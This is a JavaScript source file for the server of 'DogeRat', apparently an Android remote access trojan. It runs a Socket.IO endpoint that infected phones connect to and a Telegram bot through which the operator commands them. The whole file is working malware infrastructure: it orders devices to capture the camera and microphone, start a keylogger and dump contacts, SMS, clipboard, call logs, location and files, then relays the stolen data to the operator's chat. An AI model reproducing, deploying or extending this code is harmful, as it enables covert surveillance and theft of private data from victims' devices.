const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// ========== قراءة الإعدادات ==========
let data;
try {
    data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
} catch (error) {
    console.error('❌ Failed to read data.json:', error);
    process.exit(1);
}

// ========== إعدادات السيرفر ==========
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    transports: ['websocket', 'polling']
});

// ========== إعدادات البوت ==========
const bot = new telegramBot(data.token, { 
    polling: true,
    pollingOptions: {
        timeout: 30,
        limit: 100,
        retryTimeout: 5000
    }
});

// معالجة أخطاء البولينغ
bot.on('polling_error', (error) => {
    console.log('⚠️ Polling error:', error.code);
    if (error.code === 'ETELEGRAM' || error.code === 'ECONNRESET') {
        console.log('🔄 Reconnecting bot...');
        setTimeout(() => {
            try {
                bot.startPolling();
            } catch (e) {
                console.log('❌ Reconnection failed:', e.message);
            }
        }, 5000);
    }
});

// ========== تخزين البيانات ==========
const connectedDevices = new Map();
const selectedDevice = new Map();

// ========== إعدادات Express ==========
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========== المسارات ==========
app.get('/', (req, res) => {
    res.send('✅ DogeRat Server is running!');
});

app.get('/ping', (req, res) => {
    res.send('pong');
});

app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'ok',
        devices: connectedDevices.size,
        uptime: process.uptime()
    });
});

// ========== أوامر البوت ==========
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) {
        bot.sendMessage(chatId, '⛔ Unauthorized access!');
        return;
    }

    bot.sendMessage(data.id, `
<b>✯ Welcome to DOGERAT</b>

🔴 Real-time control
📱 Android device management
🔐 Advanced features

<b>Developed by: @CYBERSHIELDX</b>
    `, {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [
                ['✯ Devices ✯', '✯ About us ✯'],
                ['✯ Cancel action ✯']
            ],
            resize_keyboard: true
        }
    });
});

bot.onText(/✯ Devices ✯/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    if (connectedDevices.size === 0) {
        bot.sendMessage(data.id, '<b>✯ There is no connected device</b>', {
            parse_mode: 'HTML'
        });
        return;
    }

    let message = `<b>✯ Connected devices count: ${connectedDevices.size}</b>\n\n`;
    let index = 1;
    const deviceButtons = [];

    for (const [deviceId, device] of connectedDevices) {
        message += `<b>${index}.</b>\n`;
        message += `<b>device</b> → ${device.name}\n`;
        message += `<b>model</b> → ${device.model}\n`;
        message += `<b>ip</b> → ${device.ip}\n`;
        message += `<b>time</b> → ${device.time}\n\n`;
        deviceButtons.push([deviceId]);
        index++;
    }

    deviceButtons.push(['✯ All ✯']);
    deviceButtons.push(['✯ Cancel action ✯']);

    bot.sendMessage(data.id, message, {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: deviceButtons,
            resize_keyboard: true,
            one_time_keyboard: true
        }
    });
});

bot.onText(/✯ All ✯/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    selectedDevice.set('target', 'all');

    bot.sendMessage(data.id, '<b>✯ Select action to perform for all available devices</b>', {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [
                ['✯ Contacts ✯', '✯ SMS ✯'],
                ['✯ Apps ✯', '✯ Main camera ✯'],
                ['✯ Selfie Camera ✯', '✯ Microphone ✯'],
                ['✯ Vibrate ✯', '✯ Toast ✯'],
                ['✯ Clipboard ✯', '✯ Notification ✯'],
                ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
                ['✯ Cancel action ✯']
            ],
            resize_keyboard: true,
            one_time_keyboard: true
        }
    });
});

// ========== اختيار جهاز معين ==========
bot.onText(/^[a-zA-Z0-9_-]+$/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    const deviceId = msg.text;
    if (connectedDevices.has(deviceId)) {
        selectedDevice.set('target', deviceId);
        const device = connectedDevices.get(deviceId);
        bot.sendMessage(data.id, `<b>✯ Select action to perform for ${device.name}</b>\n\n`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['✯ Contacts ✯', '✯ SMS ✯'],
                    ['✯ Apps ✯', '✯ Main camera ✯'],
                    ['✯ Selfie Camera ✯', '✯ Microphone ✯'],
                    ['✯ Vibrate ✯', '✯ Toast ✯'],
                    ['✯ Clipboard ✯', '✯ Notification ✯'],
                    ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
                    ['✯ Cancel action ✯']
                ],
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });
    }
});

// ========== معالجة الأوامر (المعدلة) ==========
const handleCommand = (command, msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    const target = selectedDevice.get('target');
    let deviceId;

    if (target === 'all') {
        if (connectedDevices.size === 0) {
            bot.sendMessage(data.id, '❌ No devices connected');
            return;
        }
        // إرسال الأمر مباشرة لجميع الأجهزة
        io.emit(command);
        bot.sendMessage(data.id, `📩 ${command} command sent to all devices!`);
        return;
    } else if (target && connectedDevices.has(target)) {
        deviceId = target;
    } else {
        const firstDevice = [...connectedDevices.keys()][0];
        if (!firstDevice) {
            bot.sendMessage(data.id, '❌ No device connected');
            return;
        }
        deviceId = firstDevice;
    }

    // إرسال الأمر مباشرة (بدون "command" wrapper)
    io.to(deviceId).emit(command);
    const device = connectedDevices.get(deviceId);
    bot.sendMessage(data.id, `📩 ${command} command sent to ${device?.name || 'device'}!`);
};

// ========== تسجيل الأوامر ==========
bot.onText(/✯ Contacts ✯/, (msg) => handleCommand('contacts', msg));
bot.onText(/✯ SMS ✯/, (msg) => handleCommand('messages', msg));  // التطبيق يستخدم 'messages'
bot.onText(/✯ Apps ✯/, (msg) => handleCommand('apps', msg));
bot.onText(/✯ Main camera ✯/, (msg) => handleCommand('camera_main', msg));
bot.onText(/✯ Selfie Camera ✯/, (msg) => handleCommand('camera_selfie', msg));
bot.onText(/✯ Microphone ✯/, (msg) => handleCommand('microphone', msg));
bot.onText(/✯ Vibrate ✯/, (msg) => handleCommand('vibrate', msg));
bot.onText(/✯ Toast ✯/, (msg) => handleCommand('toast', msg));
bot.onText(/✯ Clipboard ✯/, (msg) => handleCommand('clipboard', msg));
bot.onText(/✯ Notification ✯/, (msg) => handleCommand('show_notification', msg));
bot.onText(/✯ Keylogger ON ✯/, (msg) => handleCommand('keylogger_on', msg));
bot.onText(/✯ Keylogger OFF ✯/, (msg) => handleCommand('keylogger_off', msg));

// ========== إلغاء الأمر ==========
bot.onText(/✯ Cancel action ✯/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    selectedDevice.delete('target');
    bot.sendMessage(data.id, '✅ Action cancelled', {
        reply_markup: {
            keyboard: [
                ['✯ Devices ✯', '✯ About us ✯'],
                ['✯ Cancel action ✯']
            ],
            resize_keyboard: true
        }
    });
});

// ========== معلومات عن الأداة ==========
bot.onText(/✯ About us ✯/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    bot.sendMessage(data.id, `
<b>✯ About DOGERAT</b>

🔴 Real-time control
📱 Android device management
🔐 Advanced features

<b>Developed by: @CYBERSHIELDX</b>
    `, {
        parse_mode: 'HTML'
    });
});

// ========== اتصالات Socket.IO ==========
io.on('connection', (socket) => {
    console.log('🔌 New socket connection:', socket.id);
    
    const deviceName = socket.handshake.headers['device-name'] || 'Unknown';
    const deviceModel = socket.handshake.headers['device-model'] || 'Unknown';
    const deviceIp = socket.handshake.address || 'Unknown';

    const deviceInfo = {
        id: socket.id,
        name: deviceName,
        model: deviceModel,
        ip: deviceIp,
        time: new Date().toLocaleString()
    };
    
    connectedDevices.set(socket.id, deviceInfo);
    console.log(`✅ Device connected: ${deviceName} (${deviceModel})`);
    
    bot.sendMessage(data.id, `
✅ <b>New device connected</b>

📱 <b>Device:</b> ${deviceName}
📟 <b>Model:</b> ${deviceModel}
🌐 <b>IP:</b> ${deviceIp}
🕐 <b>Time:</b> ${new Date().toLocaleString()}
    `, { parse_mode: 'HTML' });

    // استقبال الأوامر من الجهاز
    socket.on('command', (commandData) => {
        const { request } = commandData;
        const device = connectedDevices.get(socket.id);
        console.log(`📩 Command from device: ${request} from ${device?.name}`);
        bot.sendMessage(data.id, `📩 Device received: ${request} from ${device?.name || 'Unknown'}`);
    });

    // استقبال البيانات من الجهاز
    socket.on('data', (socketData) => {
        const { type, content } = socketData;
        const device = connectedDevices.get(socket.id);
        const deviceName = device?.name || 'Unknown';

        console.log(`📊 Data received: ${type} from ${deviceName}`);

        switch (type) {
            case 'contacts':
                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
                    caption: `📋 Contacts from: ${deviceName}`,
                    filename: `contacts_${deviceName}.json`
                });
                break;

            case 'messages':
                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
                    caption: `💬 Messages from: ${deviceName}`,
                    filename: `messages_${deviceName}.json`
                });
                break;

            case 'apps':
                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
                    caption: `📱 Apps from: ${deviceName}`,
                    filename: `apps_${deviceName}.json`
                });
                break;

            case 'calls':
                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
                    caption: `📞 Calls from: ${deviceName}`,
                    filename: `calls_${deviceName}.json`
                });
                break;

            case 'location':
                bot.sendMessage(data.id, `
📍 <b>Location received from ${deviceName}</b>

🌐 Latitude: ${content.lat}
🌐 Longitude: ${content.lng}
🔗 <a href="https://maps.google.com?q=${content.lat},${content.lng}">View on Google Maps</a>
                `, { parse_mode: 'HTML' });
                break;

            case 'clipboard':
                bot.sendMessage(data.id, `
📋 <b>Clipboard from ${deviceName}</b>

${content}
                `, { parse_mode: 'HTML' });
                break;

            case 'device_info':
                bot.sendMessage(data.id, `
📱 <b>Device Info from ${deviceName}</b>

${JSON.stringify(content, null, 2)}
                `, { parse_mode: 'HTML' });
                break;

            default:
                console.log('📦 Unknown data type:', type);
                bot.sendMessage(data.id, `📦 Unknown data type: ${type} from ${deviceName}`);
        }
    });

    // استقبال الملفات
    socket.on('file', (fileData) => {
        const { filename, content } = fileData;
        const device = connectedDevices.get(socket.id);
        const deviceName = device?.name || 'Unknown';

        bot.sendDocument(data.id, Buffer.from(content), {
            caption: `📁 File from: ${deviceName}`,
            filename: filename
        });
    });

    // انقطاع الاتصال
    socket.on('disconnect', () => {
        const device = connectedDevices.get(socket.id);
        if (device) {
            connectedDevices.delete(socket.id);
            console.log(`❌ Device disconnected: ${device.name}`);
            bot.sendMessage(data.id, `
❌ <b>Device disconnected</b>

📱 <b>Device:</b> ${device.name}
📟 <b>Model:</b> ${device.model}
🕐 <b>Time:</b> ${new Date().toLocaleString()}
            `, { parse_mode: 'HTML' });
        }
    });
});

// ========== تشغيل السيرفر ==========
const PORT = process.env.PORT || 8080;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ Bot is ready!`);
    console.log(`✅ Connected devices: 0`);
});

// ========== معالجة الأخطاء ==========
process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection:', reason);
});
